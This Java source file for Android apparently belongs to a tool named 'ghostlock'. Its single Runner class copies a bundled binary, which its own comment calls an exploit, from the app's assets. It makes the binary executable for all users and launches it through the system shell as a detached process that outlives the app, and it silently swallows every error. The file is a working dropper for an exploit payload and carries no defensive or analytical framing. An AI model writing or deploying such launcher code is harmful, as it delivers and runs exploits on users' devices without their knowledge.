package com.ghostlock.bootstrap;

import android.content.Context;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public final class Runner {
    private Runner() {}

    /** Copy the bundled exploit binary to filesDir (once) and launch
     *  `e --bootstrap` detached, logging to filesDir/boot.log. */
    public static synchronized void run(Context ctx) {
        try {
            File dir = ctx.getFilesDir();
            File bin = new File(dir, "e");
            if (!bin.exists()) {
                InputStream in = ctx.getAssets().open("e");
                FileOutputStream out = new FileOutputStream(bin);
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
                in.close();
                out.close();
            }
            bin.setExecutable(true, false);
            File log = new File(dir, "boot.log");
            log.delete();
            // Detached: child survives when this process exits.
            new ProcessBuilder("/system/bin/sh", "-c",
                    "exec " + bin.getAbsolutePath() + " --bootstrap > "
                            + log.getAbsolutePath() + " 2>&1")
                    .start();
        } catch (Throwable ignored) {
        }
    }
}
